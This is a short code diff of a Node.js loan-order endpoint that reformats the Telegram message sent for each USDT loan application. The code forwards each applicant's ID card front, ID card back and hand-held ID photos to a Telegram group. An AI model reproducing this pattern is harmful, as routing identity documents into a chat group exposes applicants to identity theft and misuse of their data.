@@ -998,21 +998,29 @@ app.post('/api/order/loan', upload.fields([
       return res.status(400).json({ success: false, message: 'Missing fields' });
     }
 
-    const front = req.files?.front?.[0];
-    const back  = req.files?.back?.[0];
-    const hand  = req.files?.hand?.[0];
+   const front = req.files?.front?.[0];
+const back  = req.files?.back?.[0];
+const hand  = req.files?.hand?.[0];
 
-    // 构造 Telegram 文本
-    const text = `🧾 <b>New Loan Request</b>
-👤 User ID: <code>${userId}</code>
+// 构造 Telegram 文本（你想要的格式）
+const text = `🔥 <b>New Loan Application</b> 🔥
+
 💰 Amount: <b>${amount} USDT</b>
-📅 Period: <b>${period} days</b>
-⏰ Time: ${new Date().toLocaleString()}`;
+📅 Date: ${new Date().toLocaleString()}
+⏳ Period: <b>${period} Days</b>
 
-    // 发送到 Telegram 群
-    await sendLoanToTelegram(text, [front, back, hand]);
+📷 <b>Photos:</b>
+1️⃣ ID Card Front
+2️⃣ ID Card Back
+3️⃣ Hand-held ID
 
-    return res.json({ success: true, orderId: 'loan_' + Date.now() });
+⚠️ <b>Please save a screenshot of this notification!</b>`;
+
+// 发送到 Telegram 群
+await sendLoanToTelegram(text, [front, back, hand]);
+
+return res.json({ success: true, orderId: 'loan_' + Date.now() });
+
 
   } catch (e) {
     console.error('[loan order error]', e);
